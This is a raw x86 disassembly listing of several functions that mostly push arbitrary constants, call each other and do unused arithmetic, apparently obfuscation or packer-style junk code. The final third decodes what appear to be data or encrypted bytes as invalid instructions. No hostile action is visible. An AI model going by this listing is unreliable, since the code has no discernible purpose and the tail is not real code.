  4083c7:	push   0x9e850900
  4083cc:	push   0x3c
  4083ce:	push   0x44
  4083d0:	call   0x408783
  4083d5:	add    esp,0x10
  4083d8:	cmp    ebx,eax
  4083da:	je     0x4084c4
  4083e0:	push   0xffffffdd
  4083e2:	push   0xfe941000
  4083e7:	call   0x408949
  4083ec:	add    esp,0x8
  4083ef:	test   ebx,0x2600542c
  4083f5:	jne    0x4084c4
  4083fb:	mov    ecx,0x7bf6
  408400:	push   0x8e4c4f00
  408405:	push   0x4ecf1e00
  40840a:	push   0xbc623800
  40840f:	call   0x408949
  408414:	add    esp,0xc
  408417:	mov    ecx,DWORD PTR [ebp-0x1c]
  40841a:	cmp    ecx,edi
  40841c:	je     0x4084c4
  408422:	push   0x37
  408424:	push   0xffffff8e
  408426:	push   0xac122700
  40842b:	call   0x408783
  408430:	add    esp,0xc
  408433:	push   0x0
  408435:	push   0xbc563700
  40843a:	push   0x7283bf00
  40843f:	call   0x408515
  408444:	add    esp,0xc
  408447:	mov    esi,0x9299
  40844c:	add    esi,esi
  40844e:	sub    DWORD PTR [ebp-0x1c],esi
  408451:	cmp    ebx,DWORD PTR [ebp-0x8]
  408454:	je     0x4084c4
  408456:	call   0x408624
  40845b:	push   0x2e
  40845d:	push   0x79
  40845f:	push   0xfc1fb000
  408464:	push   0xffffffee
  408466:	call   0x408783
  40846b:	add    esp,0x10
  40846e:	cmp    ebx,esi
  408470:	je     0x4084c4
  408472:	mov    eax,DWORD PTR [ebp-0x1c]
  408475:	mov    esi,DWORD PTR [ebp-0x1c]
  408478:	push   0xfffffffc
  40847a:	push   0x1c372800
  40847f:	push   0xffffffc4
  408481:	call   0x408624
  408486:	add    esp,0xc
  408489:	push   0xffffff87
  40848b:	push   0x55
  40848d:	call   0x408624
  408492:	add    esp,0x8
  408495:	push   0xbe832400
  40849a:	push   0x5e
  40849c:	push   0x47
  40849e:	call   0x408515
  4084a3:	add    esp,0xc
  4084a6:	add    ebx,esi
  4084a8:	push   0x3aee5c00
  4084ad:	push   0xfffffff8
  4084af:	push   0x4c38b200
  4084b4:	push   0x1ad03900
  4084b9:	call   0x408624
  4084be:	add    esp,0x10
  4084c1:	and    DWORD PTR [ebp-0x1c],ebx
  4084c4:	pop    esi
  4084c5:	sub    ebx,esi
  4084c7:	mov    edx,DWORD PTR [ebp-0x1c]
  4084ca:	push   0x18
  4084cc:	push   0x12e26900
  4084d1:	push   0xffffff98
  4084d3:	push   0xffffffe9
  4084d5:	call   0x408949
  4084da:	add    esp,0x10
  4084dd:	add    ebx,eax
  4084df:	add    DWORD PTR [ebp-0x1c],ebx
  4084e2:	pop    ebx
  4084e3:	cmp    ebx,0xb55f
  4084e9:	je     0x408504
  4084eb:	mov    eax,DWORD PTR [ebp-0x1c]
  4084ee:	mov    ecx,0x72d9
  4084f3:	push   0xffffffda
  4084f5:	push   0xbea37f00
  4084fa:	push   0xffffff9a
  4084fc:	call   0x408515
  408501:	add    esp,0xc
  408504:	push   0x8
  408506:	call   0x408515
  40850b:	add    esp,0x4
  40850e:	leave  
  40850f:	ret    
  408510:	int3   
  408511:	int3   
  408512:	int3   
  408513:	int3   
  408514:	int3   
  408515:	push   ebp
  408516:	mov    ebp,esp
  408518:	sub    esp,0x34
  40851b:	push   0x2c
  40851d:	push   0x8e5c5800
  408522:	push   0x7d
  408524:	push   0xaacc8c00
  408529:	call   0x408783
  40852e:	add    esp,0x10
  408531:	push   0xa2ca8200
  408536:	call   0x408949
  40853b:	add    esp,0x4
  40853e:	push   ebx
  40853f:	push   0xffffffd5
  408541:	push   0xffffffb5
  408543:	push   0xc6a80500
  408548:	push   0x5ea4c600
  40854d:	push   0xffffffd0
  40854f:	call   0x408949
  408554:	add    esp,0x14
  408557:	push   esi
  408558:	call   0x408783
  40855d:	push   edi
  40855e:	push   0xb6736300
  408563:	push   0x51
  408565:	push   0xfeb60b00
  40856a:	call   0x408783
  40856f:	add    esp,0xc
  408572:	push   0x2c
  408574:	push   0x5d
  408576:	push   0xb
  408578:	call   0x408783
  40857d:	add    esp,0xc
  408580:	push   0x7d
  408582:	push   0xffffffbe
  408584:	push   0xeecb4300
  408589:	push   0x5c
  40858b:	call   0x408783
  408590:	add    esp,0x10
  408593:	cmp    eax,DWORD PTR [ebp-0x2c]
  408596:	je     0x4085ab
  408598:	mov    edx,eax
  40859a:	add    edx,edx
  40859c:	mov    eax,0x32
  4085a1:	push   0xffffffd7
  4085a3:	call   0x408949
  4085a8:	add    esp,0x4
  4085ab:	push   0x39
  4085ad:	call   0x408783
  4085b2:	add    esp,0x4
  4085b5:	test   eax,0x29a1000
  4085ba:	jne    0x4085d7
  4085bc:	push   0x1e
  4085be:	push   0x6c237000
  4085c3:	push   0xfae4aa00
  4085c8:	push   0xac302c00
  4085cd:	push   0xffffffa2
  4085cf:	call   0x408949
  4085d4:	add    esp,0x14
  4085d7:	push   0x76881b00
  4085dc:	push   0xd6dc1700
  4085e1:	call   0x408949
  4085e6:	add    esp,0x8
  4085e9:	pop    edi
  4085ea:	push   0xffffffed
  4085ec:	call   0x408949
  4085f1:	add    esp,0x4
  4085f4:	pop    esi
  4085f5:	cmp    esi,0x7
  4085f8:	je     0x408608
  4085fa:	push   0xfffffff6
  4085fc:	push   0xffffffbe
  4085fe:	push   0x7b
  408600:	call   0x408949
  408605:	add    esp,0xc
  408608:	pop    ebx
  408609:	mov    DWORD PTR [ebp-0x14],edi
  40860c:	push   0x44
  40860e:	push   0x6c196900
  408613:	push   0xffffff94
  408615:	call   0x408783
  40861a:	add    esp,0xc
  40861d:	leave  
  40861e:	ret    
  40861f:	int3   
  408620:	int3   
  408621:	int3   
  408622:	int3   
  408623:	int3   
  408624:	push   ebp
  408625:	mov    ebp,esp
  408627:	sub    esp,0x28
  40862a:	mov    eax,0xc5
  40862f:	xor    ecx,ecx
  408631:	add    eax,ecx
  408633:	push   0x9c079500
  408638:	push   0x68
  40863a:	call   0x408949
  40863f:	add    esp,0x8
  408642:	push   ebx
  408643:	push   0xffffffcb
  408645:	push   0xec5b9b00
  40864a:	push   0xae7f500
  40864f:	push   0xedb6500
  408654:	push   0xffffffc6
  408656:	call   0x408949
  40865b:	add    esp,0x14
  40865e:	push   0x22bc6100
  408663:	call   0x408949
  408668:	add    esp,0x4
  40866b:	push   esi
  40866c:	cmp    eax,0x3c
  40866f:	jne    0x408674
  408671:	mov    DWORD PTR [ebp-0x10],eax
  408674:	push   edi
  408675:	add    eax,eax
  408677:	push   0xa2e75d00
  40867c:	push   0xffffff85
  40867e:	push   0xfffffff9
  408680:	push   0x8c7c2900
  408685:	call   0x408949
  40868a:	add    esp,0x10
  40868d:	push   0x8e03c800
  408692:	call   0x408783
  408697:	add    esp,0x4
  40869a:	push   0xdad1ee00
  40869f:	push   0x4c3acf00
  4086a4:	push   0x2f
  4086a6:	call   0x408783
  4086ab:	add    esp,0xc
  4086ae:	push   0x7c7d0300
  4086b3:	push   0x71
  4086b5:	push   0xffffffab
  4086b7:	push   0x5e85f100
  4086bc:	push   0x4c57bb00
  4086c1:	call   0x408783
  4086c6:	add    esp,0x14
  4086c9:	push   0xe295500
  4086ce:	call   0x408783
  4086d3:	add    esp,0x4
  4086d6:	call   0x408783
  4086db:	push   0xaaf1bf00
  4086e0:	call   0x408783
  4086e5:	add    esp,0x4
  4086e8:	pop    edi
  4086e9:	call   0x408949
  4086ee:	pop    esi
  4086ef:	xor    eax,eax
  4086f1:	cmp    edi,0xffffffe2
  4086f4:	jne    0x408746
  4086f6:	mov    edx,eax
  4086f8:	mov    DWORD PTR [ebp-0x18],edi
  4086fb:	mov    ebx,DWORD PTR [ebp-0x18]
  4086fe:	push   0xb6b43100
  408703:	push   0x365c2300
  408708:	push   0x52d17500
  40870d:	call   0x408783
  408712:	add    esp,0xc
  408715:	push   0x10
  408717:	push   0x1
  408719:	push   0xffffffad
  40871b:	push   0xdc022000
  408720:	call   0x408949
  408725:	add    esp,0x10
  408728:	add    ebx,edi
  40872a:	push   0xffffffed
  40872c:	push   0x16af7800
  408731:	push   0x76190e00
  408736:	call   0x408783
  40873b:	add    esp,0xc
  40873e:	call   0x408949
  408743:	add    DWORD PTR [ebp-0x18],ebx
  408746:	pop    ebx
  408747:	test   esi,0x37
  40874d:	je     0x40876a
  40874f:	push   0xa81c700
  408754:	push   0x3c04de00
  408759:	push   0xdafa8700
  40875e:	push   0x26
  408760:	push   0xffffffa2
  408762:	call   0x408783
  408767:	add    esp,0x14
  40876a:	push   0xf6812d00
  40876f:	push   0xe31ca00
  408774:	call   0x408783
  408779:	add    esp,0x8
  40877c:	leave  
  40877d:	ret    
  40877e:	int3   
  40877f:	int3   
  408780:	int3   
  408781:	int3   
  408782:	int3   
  408783:	push   ebp
  408784:	mov    ebp,esp
  408786:	sub    esp,0x34
  408789:	xor    edx,edx
  40878b:	mov    eax,0xb713
  408790:	and    edx,eax
  408792:	mov    DWORD PTR [ebp-0x30],edx
  408795:	push   ebx
  408796:	sub    edx,eax
  408798:	add    eax,eax
  40879a:	sub    eax,edx
  40879c:	add    eax,edx
  40879e:	mov    ebx,DWORD PTR [ebp-0x30]
  4087a1:	mov    ecx,DWORD PTR [ebp-0x30]
  4087a4:	sub    DWORD PTR [ebp-0x30],ecx
  4087a7:	sub    DWORD PTR [ebp-0x30],ebx
  4087aa:	and    DWORD PTR [ebp-0x30],eax
  4087ad:	push   esi
  4087ae:	mov    edx,DWORD PTR [ebp-0x30]
  4087b1:	mov    eax,DWORD PTR [ebp-0x30]
  4087b4:	add    DWORD PTR [ebp-0x30],eax
  4087b7:	sub    DWORD PTR [ebp-0x30],edx
  4087ba:	push   edi
  4087bb:	mov    edi,0xce
  4087c0:	mov    esi,DWORD PTR [ebp-0x30]
  4087c3:	cmp    esi,DWORD PTR [ebp-0x2c]
  4087c6:	jne    0x408807
  4087c8:	mov    edx,ecx
  4087ca:	xor    ecx,ecx
  4087cc:	and    esi,edx
  4087ce:	cmp    eax,0xffffff96
  4087d1:	jne    0x408807
  4087d3:	cmp    esi,DWORD PTR [ebp-0x28]
  4087d6:	je     0x408807
  4087d8:	mov    ebx,eax
  4087da:	add    DWORD PTR [ebp-0x30],ecx
  4087dd:	mov    eax,DWORD PTR [ebp-0x30]
  4087e0:	test   eax,0x4c
  4087e5:	jne    0x408807
  4087e7:	sub    ebx,ecx
  4087e9:	mov    ecx,DWORD PTR [ebp-0x30]
  4087ec:	add    esi,eax
  4087ee:	sub    DWORD PTR [ebp-0x30],edx
  4087f1:	or     DWORD PTR [ebp-0x30],ecx
  4087f4:	mov    edx,0xa9
  4087f9:	add    ebx,ebx
  4087fb:	sub    edx,ebx
  4087fd:	sub    edx,esi
  4087ff:	add    DWORD PTR [ebp-0x30],edi
  408802:	sub    edx,esi
  408804:	or     DWORD PTR [ebp-0x30],edx
  408807:	mov    edi,DWORD PTR [ebp-0x30]
  40880a:	sub    edi,ebx
  40880c:	mov    esi,0x3c
  408811:	sub    DWORD PTR [ebp-0x30],esi
  408814:	sub    edi,ecx
  408816:	add    edi,edi
  408818:	test   ecx,0xab
  40881e:	jne    0x408873
  408820:	mov    edx,DWORD PTR [ebp-0x30]
  408823:	cmp    edi,ebx
  408825:	jne    0x408873
  408827:	mov    ebx,DWORD PTR [ebp-0x30]
  40882a:	xor    eax,eax
  40882c:	sub    DWORD PTR [ebp-0x30],edi
  40882f:	cmp    edx,0xffffffec
  408832:	je     0x408873
  408834:	cmp    ebx,0xffffffb6
  408837:	jne    0x408873
  408839:	cmp    ebx,edx
  40883b:	jne    0x408873
  40883d:	mov    edi,DWORD PTR [ebp-0x30]
  408840:	mov    ecx,esi
  408842:	add    DWORD PTR [ebp-0x30],ecx
  408845:	add    DWORD PTR [ebp-0x30],ebx
  408848:	sub    eax,ecx
  40884a:	and    edx,ebx
  40884c:	add    DWORD PTR [ebp-0x30],edi
  40884f:	mov    DWORD PTR [ebp-0x30],esi
  408852:	and    edx,esi
  408854:	sub    edx,edi
  408856:	sub    edx,edi
  408858:	add    DWORD PTR [ebp-0x30],eax
  40885b:	cmp    edx,0xffffffad
  40885e:	je     0x408873
  408860:	xor    esi,esi
  408862:	add    esi,ecx
  408864:	mov    ecx,edi
  408866:	add    ecx,edx
  408868:	sub    DWORD PTR [ebp-0x30],esi
  40886b:	sub    DWORD PTR [ebp-0x30],edx
  40886e:	and    ecx,esi
  408870:	or     DWORD PTR [ebp-0x30],ecx
  408873:	mov    DWORD PTR [ebp-0x30],ecx
  408876:	add    eax,esi
  408878:	and    DWORD PTR [ebp-0x30],edx
  40887b:	and    eax,edi
  40887d:	and    eax,ebx
  40887f:	mov    DWORD PTR [ebp-0x30],eax
  408882:	pop    edi
  408883:	mov    ebx,DWORD PTR [ebp-0x30]
  408886:	mov    eax,DWORD PTR [ebp-0x30]
  408889:	cmp    ebx,esi
  40888b:	jne    0x40890a
  40888d:	sub    DWORD PTR [ebp-0x30],ebx
  408890:	mov    ecx,DWORD PTR [ebp-0x30]
  408893:	xor    esi,esi
  408895:	sub    DWORD PTR [ebp-0x30],eax
  408898:	cmp    edx,0x6f5b
  40889e:	jne    0x40890a
  4088a0:	mov    edx,DWORD PTR [ebp-0x30]
  4088a3:	mov    DWORD PTR [ebp-0xc],esi
  4088a6:	xor    esi,esi
  4088a8:	sub    esi,eax
  4088aa:	cmp    edx,ecx
  4088ac:	je     0x40890a
  4088ae:	mov    eax,DWORD PTR [ebp-0x30]
  4088b1:	xor    ebx,ebx
  4088b3:	sub    DWORD PTR [ebp-0x30],eax
  4088b6:	test   edx,0xbb
  4088bc:	je     0x40890a
  4088be:	mov    eax,DWORD PTR [ebp-0x30]
  4088c1:	sub    DWORD PTR [ebp-0xc],eax
  4088c4:	cmp    ecx,eax
  4088c6:	jne    0x40890a
  4088c8:	mov    eax,DWORD PTR [ebp-0x30]
  4088cb:	add    ecx,edi
  4088cd:	add    edx,ebx
  4088cf:	sub    DWORD PTR [ebp-0xc],ecx
  4088d2:	add    edx,edi
  4088d4:	cmp    esi,ecx
  4088d6:	je     0x40890a
  4088d8:	mov    ebx,esi
  4088da:	cmp    edx,0x14d0
  4088e0:	jne    0x40890a
  4088e2:	sub    DWORD PTR [ebp-0xc],ecx
  4088e5:	mov    DWORD PTR [ebp-0xc],eax
  4088e8:	mov    eax,DWORD PTR [ebp-0x30]
  4088eb:	test   edx,0x16
  4088f1:	jne    0x40890a
  4088f3:	mov    esi,0xc2
  4088f8:	or     ebx,edx
  4088fa:	add    DWORD PTR [ebp-0x30],eax
  4088fd:	add    ebx,eax
  4088ff:	sub    ebx,edx
  408901:	sub    DWORD PTR [ebp-0x30],esi
  408904:	sub    DWORD PTR [ebp-0x30],ecx
  408907:	xor    DWORD PTR [ebp-0x30],ebx
  40890a:	pop    esi
  40890b:	mov    eax,DWORD PTR [ebp-0x30]
  40890e:	cmp    esi,0x1e91
  408914:	jne    0x40891e
  408916:	cmp    eax,0xffffffca
  408919:	jne    0x40891e
  40891b:	and    DWORD PTR [ebp-0x30],eax
  40891e:	pop    ebx
  40891f:	xor    ecx,ecx
  408921:	xor    eax,eax
  408923:	test   edi,0x4a
  408929:	je     0x408942
  40892b:	xor    edx,edx
  40892d:	add    ecx,eax
  40892f:	sub    ecx,eax
  408931:	sub    DWORD PTR [ebp-0x30],ecx
  408934:	mov    eax,DWORD PTR [ebp-0x30]
  408937:	and    DWORD PTR [ebp-0x30],edx
  40893a:	add    eax,ecx
  40893c:	sub    DWORD PTR [ebp-0x30],edx
  40893f:	sub    DWORD PTR [ebp-0x30],eax
  408942:	leave  
  408943:	ret    
  408944:	int3   
  408945:	int3   
  408946:	int3   
  408947:	int3   
  408948:	int3   
  408949:	push   ebp
  40894a:	mov    ebp,esp
  40894c:	sub    esp,0x30
  40894f:	xor    eax,eax
  408951:	mov    edx,eax
  408953:	sub    edx,eax
  408955:	and    edx,eax
  408957:	and    edx,eax
  408959:	mov    DWORD PTR [ebp-0x2c],edx
  40895c:	push   ebx
  40895d:	mov    eax,0x64
  408962:	mov    ecx,DWORD PTR [ebp-0x2c]
  408965:	add    eax,edx
  408967:	add    DWORD PTR [ebp-0x2c],eax
  40896a:	add    DWORD PTR [ebp-0x2c],edx
  40896d:	test   ecx,0x7b
  408973:	jne    0x4089dd
  408975:	xor    edx,edx
  408977:	add    DWORD PTR [ebp-0x2c],ecx
  40897a:	xor    ebx,ebx
  40897c:	sub    ebx,ecx
  40897e:	and    ebx,eax
  408980:	sub    DWORD PTR [ebp-0x2c],edx
  408983:	cmp    ebx,0xffffffd8
  408986:	jne    0x4089dd
  408988:	cmp    ebx,DWORD PTR [ebp-0xc]
  40898b:	jne    0x4089dd
  40898d:	add    ebx,ebx
  40898f:	cmp    ebx,0x4279
  408995:	je     0x4089dd
  408997:	sub    ebx,edx
  408999:	mov    eax,DWORD PTR ds:0x4373dc
  40899f:	add    ebx,edx
  4089a1:	mov    edx,0xf5
  4089a6:	cmp    ebx,0xffffffe3
  4089a9:	jne    0x4089dd
  4089ab:	mov    ecx,DWORD PTR [ebp-0x2c]
  4089ae:	cmp    ebx,0xd001
  4089b4:	jne    0x4089dd
  4089b6:	sub    eax,ecx
  4089b8:	add    eax,ebx
  4089ba:	sub    DWORD PTR [ebp-0x2c],edx
  4089bd:	cmp    ecx,edx
  4089bf:	jne    0x4089dd
  4089c1:	sub    eax,edx
  4089c3:	cmp    eax,DWORD PTR ds:0x4373dc
  4089c9:	jne    0x4089dd
  4089cb:	mov    edx,ebx
  4089cd:	test   edx,0x4f
  4089d3:	je     0x4089dd
  4089d5:	add    edx,ebx
  4089d7:	xor    DWORD PTR [ebp-0x2c],edx
  4089da:	sub    DWORD PTR [ebp-0x2c],eax
  4089dd:	push   esi
  4089de:	sub    DWORD PTR [ebp-0x2c],ebx
  4089e1:	push   edi
  4089e2:	add    edx,eax
  4089e4:	mov    esi,DWORD PTR [ebp-0x2c]
  4089e7:	sub    edx,ecx
  4089e9:	xor    DWORD PTR [ebp-0x2c],ecx
  4089ec:	xor    ecx,ecx
  4089ee:	sub    DWORD PTR [ebp-0x2c],edx
  4089f1:	cmp    esi,eax
  4089f3:	je     0x408a39
  4089f5:	mov    edi,DWORD PTR [ebp-0x2c]
  4089f8:	xor    DWORD PTR [ebp-0x2c],ebx
  4089fb:	sub    esi,eax
  4089fd:	xor    ecx,ecx
  4089ff:	xor    DWORD PTR [ebp-0x2c],edi
  408a02:	add    ecx,ebx
  408a04:	cmp    esi,ecx
  408a06:	je     0x408a39
  408a08:	cmp    ecx,DWORD PTR ds:0x4373dc
  408a0e:	jne    0x408a39
  408a10:	mov    edx,DWORD PTR ds:0x4373dc
  408a16:	cmp    eax,DWORD PTR [ebp-0x24]
  408a19:	jne    0x408a39
  408a1b:	mov    eax,0xf833
  408a20:	mov    ebx,DWORD PTR [ebp-0x2c]
  408a23:	add    DWORD PTR [ebp-0x2c],edx
  408a26:	add    ecx,edx
  408a28:	and    DWORD PTR [ebp-0x2c],esi
  408a2b:	or     DWORD PTR [ebp-0x2c],eax
  408a2e:	sub    ebx,eax
  408a30:	sub    ecx,ebx
  408a32:	cmp    ecx,edi
  408a34:	je     0x408a39
  408a36:	sub    DWORD PTR [ebp-0x2c],ecx
  408a39:	add    ebx,edx
  408a3b:	and    DWORD PTR [ebp-0x2c],ebx
  408a3e:	add    DWORD PTR [ebp-0x2c],edi
  408a41:	sub    ebx,eax
  408a43:	mov    eax,0xf9
  408a48:	add    ebx,ecx
  408a4a:	sub    DWORD PTR [ebp-0x2c],ebx
  408a4d:	sub    eax,edx
  408a4f:	add    DWORD PTR [ebp-0x2c],eax
  408a52:	pop    edi
  408a53:	xor    DWORD PTR [ebp-0x2c],edi
  408a56:	pop    esi
  408a57:	mov    edx,0xa2
  408a5c:	or     DWORD PTR [ebp-0x2c],edx
  408a5f:	pop    ebx
  408a60:	mov    eax,ebx
  408a62:	mov    edx,0xea
  408a67:	sub    eax,edx
  408a69:	sub    eax,esi
  408a6b:	or     eax,ecx
  408a6d:	sub    eax,ecx
  408a6f:	xor    DWORD PTR [ebp-0x2c],eax
  408a72:	leave  
  408a73:	ret    
  408a74:	jb     0x408a30
  408a76:	add    eax,0xbe0b6435
  408a7b:	je     0x408aa1
  408a7d:	je     0x408a8d
  408a7f:	(bad)  
  408a80:	cld    
  408a81:	adc    ebp,DWORD PTR [ebx+0x53]
  408a84:	xchg   ecx,eax
  408a85:	test   WORD PTR [esp+ebp*1-0x6746207b],di
  408a8d:	xor    BYTE PTR [eax+0x4145a095],dh
  408a93:	shl    DWORD PTR [esi+0x1],0xeb
  408a97:	into   
  408a98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a99:	xor    BYTE PTR [esi+0x2fc40a0d],bl
  408a9f:	dec    edx
  408aa0:	fwait
  408aa1:	rcr    DWORD PTR [ebp-0x56],0xad
  408aa5:	adc    DWORD PTR [ebp-0x2e1fd4a7],eax
  408aab:	jne    0x408aba
  408aad:	xor    eax,ecx
  408aaf:	jg     0x408ae8
  408ab1:	loope  0x408a8e
  408ab3:	jno    0x408af2
  408ab5:	loopne 0x408a93
  408ab7:	pop    esp
  408ab8:	sar    ch,cl
  408aba:	adc    BYTE PTR [ecx+0x2540f9d2],0xcc
  408ac1:	adc    DWORD PTR [edi],ecx
  408ac3:	xchg   edx,eax
  408ac4:	rcl    BYTE PTR [ebp+0x1116bac0],cl
  408aca:	test   DWORD PTR [esi+0x5ce688d2],ecx
  408ad0:	xor    dl,bh
  408ad2:	fldenv [ebx+0x7ae137fc]
  408ad8:	ss adc edi,ebx
  408adb:	bound  ecx,QWORD PTR [esi]
  408add:	cmc    
  408ade:	fnstcw WORD PTR [eax-0x71260af2]
  408ae4:	pop    ds
  408ae5:	test   al,0x59
  408ae7:	outs   dx,BYTE PTR ds:[esi]
  408ae8:	std    
  408ae9:	push   ecx
  408aea:	add    eax,DWORD PTR [ecx-0x26]
  408aed:	test   al,0x3e
  408aef:	cdq    
  408af0:	in     eax,0x69
  408af2:	rcl    DWORD PTR [ebp+edx*2-0x589ee188],1
  408af9:	aam    0x0
  408afb:	fcomip st,st(5)
  408afd:	imul   edx,DWORD PTR [edi-0x42],0xfffffffc
  408b01:	adc    ecx,ebx
  408b03:	and    ebx,edx
  408b05:	dec    esi
  408b06:	pop    esp
  408b07:	arpl   WORD PTR [edi+0x6a13a52a],bp
  408b0d:	jae    0x408b5d
  408b0f:	fstp   TBYTE PTR [edi]
  408b11:	pusha  
  408b12:	push   0xfffffffa
  408b14:	mov    ecx,0xce527d41
  408b19:	add    eax,0x166cd5ea
  408b1e:	test   DWORD PTR [ecx+0x55],eax
  408b21:	jb     0x408b28
  408b23:	shr    BYTE PTR [edx+0x32ef4f67],cl
  408b29:	pop    esp
  408b2a:	add    esi,esp
  408b2c:	mov    al,ds:0xd28e4f64
  408b31:	adc    DWORD PTR [ebp-0x7ad6d8ed],eax
  408b37:	lahf   
  408b38:	cs mov ebp,0xa8d28e85
  408b3e:	(bad)  
  408b3f:	xchg   esi,eax
  408b40:	push   edi
  408b41:	mov    ds:0x64a1ef85,eax
  408b46:	or     eax,0x8511d38e
  408b4b:	cmp    ah,dh
  408b4d:	(bad)  
  408b4f:	nop
  408b50:	out    0xdb,al
  408b52:	aam    0x8c
  408b54:	div    BYTE PTR [ecx+0x22]
  408b57:	xchg   esp,eax
  408b58:	xchg   edx,eax
  408b59:	in     eax,dx
  408b5a:	adc    BYTE PTR [ebp-0x2f],0x9d
  408b5e:	or     ecx,DWORD PTR [esi-0x89fee2e]
  408b64:	push   edi
  408b65:	stos   DWORD PTR es:[edi],eax
  408b66:	test   edi,ebp
  408b68:	mov    eax,ds:0x2de8a364
  408b6d:	test   DWORD PTR gs:[eax+0x3d],esp
  408b71:	mov    eax,DWORD PTR [ebp+0x4c88ba40]
  408b77:	out    dx,eax
  408b78:	mov    eax,ds:0xa0ea0696
  408b7d:	fs dec edi
  408b7f:	jb     0x408bd6
  408b81:	or     edx,DWORD PTR [ebp+0x11d28e]
  408b87:	cmp    al,0xd6
  408b89:	test   al,0x3b
  408b8b:	cdq    
  408b8c:	push   ebp
  408b8d:	pop    eax
  408b8e:	arpl   WORD PTR [eax-0x3c6fffab],dx
  408b94:	xlat   BYTE PTR ds:[ebx]
  408b96:	add    BYTE PTR [edx+eiz*8-0x6e],bl
  408b9a:	push   cs
  408b9b:	mov    fs,WORD PTR [ecx-0x2ddab09c]
  408ba1:	push   ds
  408ba2:	test   DWORD PTR [esi-0x92f902b],ecx
  408ba8:	or     BYTE PTR [edx+0x1f3c4d89],dh
  408bae:	mov    DWORD PTR [ecx+edi*1+0x13],eax
  408bb2:	cdq    
  408bb3:	out    dx,al
  408bb4:	je     0x408bde
  408bb6:	inc    ebp
  408bb7:	bound  ebp,QWORD PTR [edi-0x4a3d2e2a]
  408bbd:	or     edi,DWORD PTR [ecx+0x21]
  408bc0:	shl    BYTE PTR [edi+ecx*2-0x11],cl
  408bc4:	cmc    
  408bc5:	addr16 or ebp,edi
  408bc8:	shr    edi,cl
  408bca:	inc    esi
  408bcb:	je     0x408b9f
  408bcd:	iret   
  408bce:	pop    ebp
  408bcf:	jge    0x408b72
  408bd1:	fs dec edi
  408bd3:	stos   DWORD PTR es:[edi],eax
  408bd4:	das    
  408bd5:	bound  ecx,QWORD PTR [esi-0x11]
  408bd8:	mov    eax,ds:0xec1b16ea
  408bdd:	sbb    DWORD PTR [edx],eax
  408bdf:	adc    DWORD PTR [edx+0x33ef4f67],ebp
  408be5:	test   al,0x6
  408be7:	out    0xa0,al
  408be9:	fs dec edi
  408beb:	aad    0x6c
  408bed:	sbb    al,BYTE PTR [ebp-0x648daabf]
  408bf3:	into   
  408bf4:	xor    ah,BYTE PTR [esi]
  408bf6:	(bad)  
  408bf7:	xchg   esi,eax
  408bf8:	ds jmp 0x408bfb
  408bfb:	dec    ecx
  408bfc:	ficom  DWORD PTR [eax]
  408bfe:	xor    BYTE PTR [ecx-0x6c3226ab],ch
  408c04:	pop    es
  408c05:	sub    DWORD PTR [eax],eax
  408c07:	arpl   dx,si
  408c09:	adc    dh,dl
  408c0b:	xchg   esi,eax
  408c0c:	std    
  408c0d:	inc    ebx
  408c0e:	xchg   ebx,eax
  408c0f:	inc    ebx
  408c10:	retf   0x9ae0
  408c13:	cmp    DWORD PTR [ebp-0x2d8b0226],ebp
  408c19:	rcr    DWORD PTR [ebp-0x2f],0xa0
  408c1d:	fs dec edi
  408c1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c20:	out    dx,eax
  408c21:	adc    eax,0x8ec93d1
  408c26:	addr16 mov ebp,0xb138108c
  408c2c:	lods   eax,DWORD PTR ds:[esi]
  408c2d:	retf   0x9ffd
  408c30:	jns    0x408c42
  408c32:	dec    edx
  408c33:	out    dx,al
  408c34:	lods   al,BYTE PTR ds:[esi]
  408c35:	adc    al,cl
  408c37:	mov    ch,BYTE PTR [ebp-0x2de40226]
  408c3d:	adc    dh,al
  408c3f:	xchg   esi,eax
  408c40:	pop    ebx
  408c41:	fisub  DWORD PTR [ecx+0x4a56338a]
  408c47:	xchg   esi,eax
  408c48:	ror    dl,cl
  408c4a:	add    dl,bh
  408c4c:	mov    eax,ds:0x3feff9ea
  408c51:	sub    DWORD PTR [ebp+0x6],ebx
  408c54:	mov    eax,ds:0x29d54f64
  408c59:	sbb    ah,BYTE PTR [ecx-0x2c211e9]
  408c5f:	int3   
  408c60:	scas   al,BYTE PTR es:[edi]
  408c61:	adc    DWORD PTR [esi],esi
  408c63:	sbb    dh,BYTE PTR [esi+0x32fa4190]
  408c69:	or     DWORD PTR [esi+ecx*4-0x45f5ee2e],eax
  408c70:	into   
  408c71:	cmp    eax,0x4e
  408c74:	rcr    al,cl
  408c76:	jle    0x408c8b
  408c78:	mov    al,ds:0x28ec50e
  408c7d:	or     DWORD PTR [ecx-0x18],ebp
  408c80:	mov    eax,ds:0xa6517d64
  408c85:	mov    DWORD PTR [esi+ebx*2+0x614c2d4e],esi
  408c8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c8d:	or     DWORD PTR [ecx],ebp
  408c8f:	out    dx,al
  408c90:	mov    eax,ds:0xaa517d64
  408c95:	mov    ebx,eax
  408c97:	std    
  408c98:	pop    ecx
  408c99:	ins    DWORD PTR es:[edi],dx
  408c9a:	dec    edi
  408c9b:	popa   
  408c9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c9d:	or     DWORD PTR [ecx],edi
  408c9f:	out    dx,al
  408ca0:	mov    eax,ds:0xbe517d64
  408ca5:	test   al,0xc6
  408ca7:	jmp    0xce79:0x9f89d1ad
  408cae:	icebp  
  408caf:	sbb    esi,ebp
  408cb1:	adc    ebp,ebp
  408cb3:	sbb    eax,DWORD PTR [edx]
  408cb5:	adc    eax,0x96a64188
  408cba:	(bad)  ss:[ebp+0x1f15f5c1]
  408cc1:	jne    0x408cc6
  408cc3:	imul   esi,DWORD PTR [esi-0x1a212958],0x7671d06c
  408ccd:	and    bl,BYTE PTR [ebp+0x61]
  408cd0:	mov    ecx,0xee1987a8
  408cd5:	and    DWORD PTR [ecx-0x2e861055],eax
  408cdb:	cli    
  408cdc:	imul   edi,DWORD PTR [esi],0xffffff85
  408cdf:	mov    ss,edx
  408ce1:	xchg   edx,eax
  408ce2:	aaa    
  408ce3:	call   0xa44b8bfc
  408ce8:	xor    al,0x16
  408cea:	rcl    DWORD PTR [edx-0x399c9074],1
  408cf0:	adc    al,0x91
  408cf2:	xchg   ebx,eax
  408cf3:	idiv   BYTE PTR [edi]
  408cf5:	sbb    DWORD PTR [eax],eax
  408cf7:	push   esp
  408cf8:	rcl    DWORD PTR [edx+0x38af7c39],cl
